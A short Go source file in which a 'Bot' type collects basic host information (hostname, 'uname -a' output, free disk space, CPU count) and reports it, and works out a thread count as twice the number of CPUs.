package lib

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strconv"

	"golang.org/x/sys/unix"
)

func (b Bot) threadsNumber() string {
	return strconv.Itoa(b.CPU * 2)
}

func (b *Bot) ReportInfo() {
	hName, err := os.Hostname()
	if err != nil {
		b.Report("Can not get hostname")
	}
	wd, _ := os.Getwd()
	uname, err := exec.Command("uname", "-a").Output()
	if err != nil {
		b.Report("Can not get bot system information")
	}
	b.CPU = runtime.NumCPU()

	freeDiskSpace := func(wd string) uint64 {
		var stat unix.Statfs_t
		unix.Statfs(wd, &stat)
		return stat.Bavail * uint64(stat.Bsize) / 1024 / 1024 / 1024
	}(wd)

	b.Report("Host Name: " + hName)
	b.Report("System: " + string(uname))
	b.Report("Free Disk Space (GB): " + fmt.Sprint(freeDiskSpace))
	b.Report("Number of CPUs: " + strconv.Itoa(b.CPU))
	b.Report("Number of Threads: " + b.threadsNumber())
}
